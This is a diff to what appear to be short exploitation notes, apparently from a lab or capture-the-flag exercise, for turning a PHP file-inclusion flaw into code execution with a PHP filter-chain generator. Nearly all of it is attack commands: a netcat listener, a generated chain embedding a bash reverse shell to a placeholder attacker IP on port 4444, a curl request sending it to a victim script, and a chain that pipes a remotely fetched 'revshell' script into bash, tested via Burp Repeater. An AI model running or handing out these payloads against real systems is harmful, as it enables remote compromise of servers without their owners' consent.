@@ -4,7 +4,21 @@ git clone https://github.com/synacktiv/php_filter_chain_generator.git
 
 python3 php_filter_chain_generator.py — chain ‘<?php phpinfo(); ?>
 
+-----------------------------------------------------------------------------------
+
+Run python3 -m http.server 80
+
+Run nc -lvnp 1234
+
+ python3 php_filter_chain_generator.py --chain 
+"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1\"'); ?>" | grep "^php" > payload.txt
+
+curl "http://<vivtim_ip/secret-script.php?file=$(cat payload.txt)"
+
+
+
 --------------------------------------------------------------------------
+In Burp Suite
 
 Create your Script and call it “revshell”:
 
@@ -17,6 +31,8 @@ Run nc -lvnp 1234
 Create the chain command with the python script:
 
 python3 php_filter_chain_generator.py — chain ‘curl -s -L YOUR_IP/revshell|bash ?>’
+
+Pass the output in Repeater in Burp 
 
 
 
